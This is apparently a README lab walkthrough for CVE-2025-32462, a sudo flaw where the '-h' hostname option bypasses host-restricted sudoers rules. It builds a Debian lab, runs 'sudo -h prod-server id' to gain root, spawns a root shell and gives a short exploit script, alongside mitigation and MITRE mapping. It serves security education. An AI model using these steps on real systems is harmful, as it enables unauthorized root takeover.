# CVE-2025-32462 – Sudo Hostname Bypass Privilege Escalation

![CVE](https://img.shields.io/badge/CVE-2025--32462-critical)
![Cyber Security](https://img.shields.io/badge/Cyber%20Security-0a1a2f)
![Penetration Testing](https://img.shields.io/badge/Penetration%20Testing-darkred)
![Security Research](https://img.shields.io/badge/Security%20Research-purple)


## Table of Contents

1. Overview
2. Vulnerability Details
3. Impact
4. Lab Environment
5. Verification of Vulnerable Version
6. User & sudoers Configuration
7. Exploitation Walkthrough
8. Proof of Concept Summary
9. Why Ubuntu Is Not Vulnerable
10. Mitigation
11. MITRE ATT&CK Mapping
12. References
13. Disclaimer

## Overview

CVE-2025-32462 is a **local privilege escalation vulnerability** in `sudo` that allows a low‑privileged user to execute commands as **root** by abusing **hostname‑restricted sudo rules**. The issue lies in how `sudo` historically handled the `-h` (host) option during authorization checks.

When a sudoers rule is restricted to a specific hostname, `sudo` should only permit execution when the system hostname matches the rule. Due to flawed logic, affected versions trusted a **user‑supplied hostname** via `sudo -h`, allowing attackers to bypass the restriction entirely.

---

## Vulnerability Details

* **CVE ID:** CVE-2025-32462
* **Type:** Local Privilege Escalation
* **Affected Component:** sudo
* **Attack Vector:** Local
* **Privileges Required:** Low (non‑sudo user)
* **User Interaction:** None

### Root Cause

`sudo` allowed the `-h <hostname>` argument to influence authorization decisions. In vulnerable versions, the supplied hostname was trusted during sudoers rule evaluation, instead of strictly validating against the system’s real hostname.

As a result, host‑based sudo restrictions could be bypassed.

---

## Impact

If exploited successfully, a local attacker can:

* Execute arbitrary commands as **root**
* Fully compromise the system
* Bypass administrative security boundaries

In real‑world environments, this vulnerability is particularly dangerous in:

* Multi‑user systems
* Hardened environments using host‑specific sudo rules
* Bastion or jump hosts

---

## Lab Environment

| Component      | Details                          |
| -------------- | -------------------------------- |
| OS             | Debian 11 (Bullseye – unpatched) |
| sudo Version   | ≤ 1.9.13                         |
| Access Level   | Local user                       |
| Virtualization | VirtualBox                       |

> ⚠️ **Note:** Modern Ubuntu and Debian releases have backported patches while retaining similar version strings. This vulnerability **cannot be reproduced** on patched systems.

---

## Step 1 – Verify Vulnerable sudo Version

```bash
sudo --version
```

Expected (vulnerable):

```
Sudo version 1.9.5p2
```

---

## Step 2 – Create Low‑Privileged User

```bash
sudo useradd -m attacker
sudo passwd attacker
groups attacker
```

Expected:

```
attacker : attacker
```

The user must **not** belong to the `sudo` group.

---

## Step 3 – Configure Vulnerable sudoers Rule

Edit sudoers safely:

```bash
sudo visudo
```

Add the following line:

```
attacker prod-server = (root) ALL
```

* `prod-server` is a **fake hostname**
* The real system hostname must be different

Verify:

```bash
sudo -l -U attacker
```

Expected:

```
User attacker may run the following commands on prod-server:
    (root) ALL
```

---

## Step 4 – Confirm Normal sudo Is Denied

Switch user:

```bash
su - attacker
```

Attempt sudo normally:

```bash
sudo id
```

Expected:

```
attacker is not allowed to run sudo on <hostname>
```

---

## Step 5 – Exploitation (CVE-2025-32462)

Trigger the vulnerability:

```bash
sudo -h prod-server id
```

Successful exploitation output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Spawn a root shell:

```bash
sudo -h prod-server /bin/bash
```

Verify:

```bash
id
```

---

## Proof of Concept Summary

### Automated PoC Script (Optional)

```bash
#!/bin/bash
echo "[*] Attempting CVE-2025-32462 exploitation"
sudo -h prod-server id
```

Save as `exploit.sh`, make executable, and run as the `attacker` user:

```bash
chmod +x exploit.sh
./exploit.sh
```

| Action                   | Result   |
| ------------------------ | -------- |
| Normal sudo              | ❌ Denied |
| `sudo -h prod-server id` | ✅ Root   |

This confirms a successful privilege escalation.

---

## Why Ubuntu Is Not Vulnerable

Modern Ubuntu releases appear to ship with sudo versions that fall within the affected range. However, Ubuntu has **backported the security fix** for CVE‑2025‑32462 without changing the upstream version string.

As a result:

* The `sudo -h` option no longer influences authorization checks
* Hostname spoofing is correctly rejected
* The vulnerability cannot be reproduced despite similar version numbers

This highlights the importance of validating vulnerability status using **behavioral testing**, not version strings alone.

---

## Mitigation

* Upgrade `sudo` to a patched version
* Remove host‑restricted sudo rules where possible
* Monitor local privilege escalation attempts

---

## MITRE ATT&CK Mapping

* **TA0004 – Privilege Escalation**
* **T1548.003 – Abuse Elevation Control Mechanism (sudo)**

---

## References

* CVE‑2025‑32462 Advisory
* sudo Project Security Announcements
* Debian Security Tracker

---

## Disclaimer

This walkthrough is for **educational and defensive security research purposes only**. Do not test this vulnerability on systems you do not own or have explicit permission to assess.
